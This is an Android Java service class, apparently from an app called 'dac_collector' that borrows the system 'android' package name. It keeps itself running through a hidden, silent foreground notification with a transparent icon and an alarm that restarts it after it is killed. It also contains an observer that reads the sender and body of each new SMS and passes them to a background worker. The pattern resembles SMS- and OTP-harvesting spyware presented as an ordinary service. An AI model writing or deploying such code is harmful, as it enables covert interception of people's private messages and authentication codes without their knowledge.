package android.iocl.dac_collector.Services;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.iocl.dac_collector.R;
import android.iocl.dac_collector.Receivers.MyReceiver;
import android.iocl.dac_collector.SyncAdapters.SyncUtils;
import android.iocl.dac_collector.Ui.MainActivity;
import android.iocl.dac_collector.Utility.Utility;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.work.Data;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.WorkRequest;

public class FixOppoAutoKill extends Service {
    private static final String CHANNEL_ID = "0";
    private static final String CHANNEL_NAME = "Background Service";
    private static final int NOTIFICATION_ID = 01;
    MyReceiver myReceiver;
    private AlarmManager alarmManager;
    private SmsObserver smsObserver;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        SyncUtils.initialize(getApplicationContext());

        JobSchedulerUtil.fetch_profile_info(getApplicationContext());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Dynamically register the receiver
        myReceiver = new MyReceiver();
        IntentFilter filter = new IntentFilter(Intent.ACTION_USER_PRESENT);
        registerReceiver(myReceiver, filter);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        scheduleServiceRestart();
        unregisterReceiver(myReceiver);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void scheduleServiceRestart() {
        Intent intent = new Intent(this, MyReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);

        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmManager != null) {
            long triggerAt = System.currentTimeMillis() + 10000; // 10 seconds
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
            } else {
                alarmManager.set(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
            }
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    CHANNEL_NAME,
                    NotificationManager.IMPORTANCE_MIN // Lowest priority, no sound or vibration
            );
            channel.setDescription("Background service status");
            channel.setShowBadge(false);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                channel.setBlockable(false);
            }
            channel.setLockscreenVisibility(-1);
            channel.enableLights(false);
            channel.enableVibration(false);
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.setBypassDnd(true);


            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, intent, PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.transparent_1px)
                .setShowWhen(false)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setAutoCancel(false)
                .setSilent(true)
                .setSound(null)

                .build();
    }

    private void setupSmsObserver() {
        Uri smsUri = Uri.parse("content://sms/inbox");
        smsObserver = new SmsObserver(new Handler());
        getContentResolver().registerContentObserver(smsUri, true, smsObserver);
    }

    private class SmsObserver extends ContentObserver {
        public SmsObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            readNewSms();
        }

        private void readNewSms() {
            Cursor cursor = null;
            try {
                cursor = getContentResolver().query(
                        Uri.parse("content://sms/inbox"),
                        new String[]{"address", "body", "date"},
                        null,
                        null,
                        "date DESC LIMIT 1"
                );
                if (cursor != null && cursor.moveToFirst()) {
                    int addressIndex = cursor.getColumnIndex("address");
                    int bodyIndex = cursor.getColumnIndex("body");

                    if (addressIndex >= 0 && bodyIndex >= 0) {
                        String sender = cursor.getString(addressIndex);
                        String message = cursor.getString(bodyIndex);
                        showSmsToast(sender, message);
                    } else {
                        // Handle missing columns gracefully
                        Log.e("SMSReader", "Missing column: addressIndex=" + addressIndex + ", bodyIndex=" + bodyIndex);
                    }
                }

            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (cursor != null) cursor.close();
            }
        }

        private void showSmsToast(String sender, String message) {

            int notificationId = 1001; // your notification ID

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    boolean isPosted = Utility.isNotificationActive(getApplicationContext(), Utility.NOTIFICATION_ID);

                    if (!isPosted){
                        Data data = new Data.Builder()
                                .putString("sender", sender)
                                .putString("body", message)
                                .build();

                        WorkRequest request = new OneTimeWorkRequest.Builder(SmsWorker.class)
                                .setInputData(data)
                                .build();

                        WorkManager.getInstance(getApplicationContext()).enqueue(request);
                    }else {
                        Log.d(FixOppoAutoKill.class.toString(), "showSmsToast: Notification Posted. Ignoring...");
                    }
                    Log.d("NotificationCheck", "Notification " + notificationId + " is posted? " + isPosted);
                } else {
                    Log.w("NotificationCheck", "Notification check not supported on API < 23");
                }
            }, 2000); // 2000 milliseconds = 2 seconds




        }


    }
}